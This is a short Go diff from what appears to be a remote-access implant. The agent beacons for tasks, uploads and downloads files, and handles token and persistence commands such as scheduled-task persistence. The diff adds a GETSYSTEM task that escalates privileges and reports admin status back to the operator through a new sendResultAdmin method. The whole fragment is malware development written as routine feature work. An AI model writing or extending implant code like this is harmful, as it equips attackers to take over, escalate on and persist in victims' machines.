@@ -56,6 +56,7 @@ type transport interface {
 	register(sysInfo) error
 	beacon() ([]taskWire, error)
 	sendResult(taskID int64, output, errStr string) error
+	sendResultAdmin(taskID int64, output, errStr string, isAdmin bool) error
 	uploadFile(taskID int64, filename string, data []byte) error
 	downloadFile(filename string) ([]byte, error)
 }
@@ -540,6 +541,14 @@ func dispatchTask(t transport, task taskWire) {
 
 	case "TOKEN_WHOAMI":
 		t.sendResult(task.ID, tokenWhoami(), "")
+
+	case "GETSYSTEM":
+		out, ok := GetSystem()
+		if ok {
+			t.sendResultAdmin(task.ID, out, "", true)
+		} else {
+			t.sendResult(task.ID, out, "")
+		}
 
 	case "PERSIST", "PERSIST_TASK", "PERSIST_RM":
 		// PERSIST_TASK → schtask method; PERSIST_RM → remove; PERSIST → explicit method
